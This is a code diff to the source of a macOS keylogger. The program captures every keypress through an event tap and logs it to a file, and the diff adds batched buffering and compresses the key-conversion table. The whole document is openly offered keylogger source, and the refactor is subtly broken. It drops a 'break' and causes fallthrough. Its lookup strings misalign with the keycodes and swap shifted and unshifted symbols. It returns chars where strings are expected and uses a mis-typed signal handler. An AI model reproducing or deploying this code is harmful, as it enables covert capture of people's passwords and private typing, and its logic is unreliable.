@@ -1,8 +1,21 @@
 #include "keylogger.h"
 
 CGEventFlags lastFlags = 0;
+int BATCH_SZ = 1000;
+char buffer[1000];
+int buffer_index = 0;
+
+// flush function
+void flush() {
+  fwrite(buffer, 1, buffer_index, logfile);
+  buffer_index = 0;
+  memset(buffer, 0, BATCH_SZ);  // clean buf
+}
 
 int main(int argc, const char *argv[]) {
+  signal(SIGINT, flush);
+  signal(SIGTERM, flush);
+
   // Create an event tap to retrieve keypresses.
   CGEventMask eventMask =
       CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
@@ -99,7 +112,6 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type,
       case 57:  // [caps]
         down = (flags & kCGEventFlagMaskAlphaShift) &&
                !(lastFlags & kCGEventFlagMaskAlphaShift);
-        break;
       default:
         break;
     }
@@ -116,89 +128,40 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type,
   // Print the human readable key to the logfile.
   bool shift = flags & kCGEventFlagMaskShift;
   bool caps = flags & kCGEventFlagMaskAlphaShift;
-  fprintf(logfile, "%s", convertKeyCode(keyCode, shift, caps));
-  fflush(logfile);
+  // this should be batched up in a buffer and written to the file in one go
+  buffer[buffer_index] = convertKeyCode(keyCode, shift, caps)[0];
+  buffer_index++;
+
+  if (buffer_index == BATCH_SZ) flush();
   return event;
 }
 
 // The following method converts the key code returned by each keypress as
 // a human readable key code in const char format.
+const char *letters_cap_set1 = "ASDFHGZXCVBQWERT";
+const char *letters_cap_set2 = "OU{IP LJ";
+const char *symbols_cap_set1 = "123465+97-80]";
+
+const char *letters_small_set1 = "asdfhgzxcvbqwert";
+const char *letters_small_set2 = "ou[ip lj";
+const char *symbols_small_set1 = "!@#$^%+(&_*)}";
+
+const char *nums = "01234567 89";
+
 const char *convertKeyCode(int keyCode, bool shift, bool caps) {
   switch ((int)keyCode) {
-    case 0:
-      return shift || caps ? "A" : "a";
-    case 1:
-      return shift || caps ? "S" : "s";
-    case 2:
-      return shift || caps ? "D" : "d";
-    case 3:
-      return shift || caps ? "F" : "f";
-    case 4:
-      return shift || caps ? "H" : "h";
-    case 5:
-      return shift || caps ? "G" : "g";
-    case 6:
-      return shift || caps ? "Z" : "z";
-    case 7:
-      return shift || caps ? "X" : "x";
-    case 8:
-      return shift || caps ? "C" : "c";
-    case 9:
-      return shift || caps ? "V" : "v";
-    case 11:
-      return shift || caps ? "B" : "b";
-    case 12:
-      return shift || caps ? "Q" : "q";
-    case 13:
-      return shift || caps ? "W" : "w";
-    case 14:
-      return shift || caps ? "E" : "e";
-    case 15:
-      return shift || caps ? "R" : "r";
-    case 16:
-      return shift || caps ? "Y" : "y";
-    case 17:
-      return shift || caps ? "T" : "t";
-    case 18:
-      return shift ? "!" : "1";
-    case 19:
-      return shift ? "@" : "2";
-    case 20:
-      return shift ? "#" : "3";
-    case 21:
-      return shift ? "$" : "4";
-    case 22:
-      return shift ? "^" : "6";
-    case 23:
-      return shift ? "%" : "5";
-    case 24:
-      return shift ? "+" : "=";
-    case 25:
-      return shift ? "(" : "9";
-    case 26:
-      return shift ? "&" : "7";
-    case 27:
-      return shift ? "_" : "-";
-    case 28:
-      return shift ? "*" : "8";
-    case 29:
-      return shift ? ")" : "0";
-    case 30:
-      return shift ? "}" : "]";
-    case 31:
-      return shift || caps ? "O" : "o";
-    case 32:
-      return shift || caps ? "U" : "u";
-    case 33:
-      return shift ? "{" : "[";
-    case 34:
-      return shift || caps ? "I" : "i";
-    case 35:
-      return shift || caps ? "P" : "p";
+    case 0 ... 17:
+      return shift || caps ? letters_cap_set1[keyCode]
+                           : letters_small_set1[keyCode];
+    case 18 ... 30:
+      return shift || caps ? symbols_cap_set1[keyCode - 18]
+                           : symbols_small_set1[keyCode - 18];
+    case 31 ... 35:
+    // NO 36
     case 37:
-      return shift || caps ? "L" : "l";
     case 38:
-      return shift || caps ? "J" : "j";
+      return shift || caps ? letters_cap_set2[keyCode - 31]
+                           : letters_small_set2[keyCode - 31];
     case 39:
       return shift ? "\"" : "'";
     case 40:
@@ -222,41 +185,26 @@ const char *convertKeyCode(int keyCode, bool shift, bool caps) {
     case 65:
       return "[decimal]";
     case 67:
-      return "[asterisk]";
+      return "[star]";
     case 69:
       return "[plus]";
     case 71:
       return "[clear]";
     case 75:
-      return "[divide]";
+      return "[div]";
     case 76:
       return "[enter]";
     case 78:
       return "[hyphen]";
     case 81:
-      return "[equals]";
-    case 82:
-      return "0";
-    case 83:
-      return "1";
-    case 84:
-      return "2";
-    case 85:
-      return "3";
-    case 86:
-      return "4";
-    case 87:
-      return "5";
-    case 88:
-      return "6";
-    case 89:
-      return "7";
-    case 91:
-      return "8";
-    case 92:
-      return "9";
+      return "[eq]";
+
+    case 82 ... 89:
+    // NO 90
+    case 91 ... 92:
+      return nums[keyCode - 82];
     case 36:
-      return "[return]";
+      return "[ret]";
     case 48:
       return "[tab]";
     case 49:
@@ -266,23 +214,23 @@ const char *convertKeyCode(int keyCode, bool shift, bool caps) {
     case 53:
       return "[esc]";
     case 54:
-      return "[right-cmd]";
+      return "[r-cmd]";
     case 55:
-      return "[left-cmd]";
+      return "[l-cmd]";
     case 56:
-      return "[left-shift]";
+      return "[l-shift]";
     case 57:
       return "[caps]";
     case 58:
-      return "[left-option]";
+      return "[l-option]";
     case 59:
-      return "[left-ctrl]";
+      return "[l-ctrl]";
     case 60:
-      return "[right-shift]";
+      return "[r-shift]";
     case 61:
-      return "[right-option]";
+      return "[r-option]";
     case 62:
-      return "[right-ctrl]";
+      return "[r-ctrl]";
     case 63:
       return "[fn]";
     case 64:
